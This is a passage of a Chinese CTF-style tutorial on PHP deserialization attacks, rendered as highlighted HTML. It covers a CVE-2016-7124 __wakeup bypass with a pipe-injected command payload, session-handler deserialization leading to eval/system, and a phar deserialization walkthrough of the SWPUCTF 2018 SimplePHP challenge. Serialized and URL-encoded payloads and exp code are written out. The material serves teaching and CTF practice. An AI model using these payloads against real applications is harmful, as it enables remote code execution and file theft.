punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们观察代码可知：</p><p><code>GET</code>方法获取参数a，并且将其反序列化。</p><p>但是再执行反序列化的时候，会自动调用<code>__wakeup()</code>魔术方法，把<code>args</code>的值改为<code>127.0.0.1</code></p><p>无论我们怎么构造payload，<code>system()</code>执行的命令都是<code>ping -c 2 127.0.0.1</code></p><p>这时我们可以利用到<code>CVE-2016-7124</code>漏洞</p><blockquote><p>适用版本：</p><p>PHP5&lt;5.6.25、PHP7&lt;7.0.1</p><p>当成员属性数目大于实际数码时可绕过__wakeup方法</p></blockquote><p>就可以构造恶意payload来RCE</p><p>这里还有个小知识点<code>|</code>管道符</p><pre class="line-numbers language-none"><code class="language-none">把一个命令的标准输出传送到另一个命令的标准输入中，连续的|意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/24/xMTGeRKUBzPyNmA.png"></p><p>所以我们可以构造序列化了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">home</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token operator">=</span><span class="token double-quoted-string string">"ping"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"|calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">O:4:"home":2:{s:12:" home method";s:4:"ping";s:10:" home args";a:1:{i:0;s:7:"|calc";}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要跳一下<code>__wakeup()</code>把成员属性数目改为3</p><pre class="line-numbers language-none"><code class="language-none">O:4:"home":3:{s:12:" home method";s:4:"ping";s:10:" home args";a:1:{i:0;s:7:"|calc";}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>URL编码一下</p><pre class="line-numbers language-none"><code class="language-none">O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A4%3A%22ping%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A5%3A%22%7Ccalc%22%3B%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/24/olTV4wmYSr956LB.png"></p><p>成功RCE</p><h4 id="（2）session反序列化漏洞"><a href="#（2）session反序列化漏洞" class="headerlink" title="（2）session反序列化漏洞"></a>（2）session反序列化漏洞</h4><p>当网站序列化存储session与反序列化读取session方式不同时，就可能导致session反序列化漏洞的产生。一般都是以<code>php_serialize</code>序列化存储session，以PHP反序列化读取session，造成反序列化攻击</p><p>例子：</p><p>phpinfo：</p><p><img src="https://i.loli.net/2021/08/24/C14l6r5eLQp2AmS.png"></p><p>s1.php：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"session.serialize_handler"</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"h3"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"u"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>s2.php：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">session</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">function</span>  <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里需要说一下<code>unserialize</code>的特性，在执行<code>unserialize</code>的时候，如果字符串前面满足了可被序列化的规则，则后学的字符就会被忽略</p><pre class="line-numbers language-none"><code class="language-none">a:1:{s:2:"h3";s:52:"|O:7:"session":1:{s:3:"var";s:15:"system('calc');";}";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">session</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token double-quoted-string string">"system('calc');"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"|"</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><p><img src="https://i.loli.net/2021/08/24/UrW1hiGNb3tDOCF.png"></p><p>上文可以给<code>$_SESSION</code>赋值，若代码中不存在给<code>$_SESSION</code>赋值可以利用<code>uplode_process</code>机制，可以在<code>$_SESSION</code>中创建一个键值对，其中的值可以控制</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"session.upload_progress.prefix"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"session.upload_progress.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）phar反序列化"><a href="#（3）phar反序列化" class="headerlink" title="（3）phar反序列化"></a>（3）phar反序列化</h4><p>利用条件：</p><pre class="line-numbers language-none"><code class="language-none">-phar文件能够上传到服务器-要有可用的魔术方法作为“跳板”-文件操作函数的参数可控，且：/ \ 等特殊字符没有被过滤有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，受影响的函数如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/24/M5PC2WlcJatqrNS.png"></p><h5 id="例题"><a href="#例题" class="headerlink" title="例题:"></a>例题:</h5><p>[SWPUCTF 2018]SimplePHP</p><p><img src="https://i.loli.net/2021/08/24/rhZvp5VsES6DOzB.png"></p><p>存在任意文件读取</p><p>先来读取一下<code>upload_file.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">include</span> <span class="token single-quoted-string string">'function.php'</span><span class="token punctuation">;</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再来读取一下<code>function.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//show_source(__FILE__); </span><span class="token keyword">include</span> <span class="token double-quoted-string string">"base.php"</span><span class="token punctuation">;</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".jpg"</span><span class="token punctuation">;</span>     <span class="token comment">//mkdir("upload",0777); </span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"gif"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpeg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span>    <span class="token punctuation">}</span>     <span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span> <span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再读取一下<code>base.php</code></p><p>发现了提示</p><p><img src="https://i.loli.net/2021/08/24/4cLySiwZdTp29NI.png"></p><p>回头再来看<code>class.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this-&gt;source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>            <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在Test类中存在敏感操作</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以反向推poc链</p><p>通过file_get_content来读取我们想要的文件，也就是调用file_get函数，之前分析得知<code>__get-&gt;get-&gt;file_get</code>，所以关键是触发<code>__get</code>方法，那么就要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的<code>__tostring</code>方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this-&gt;source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>            <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" 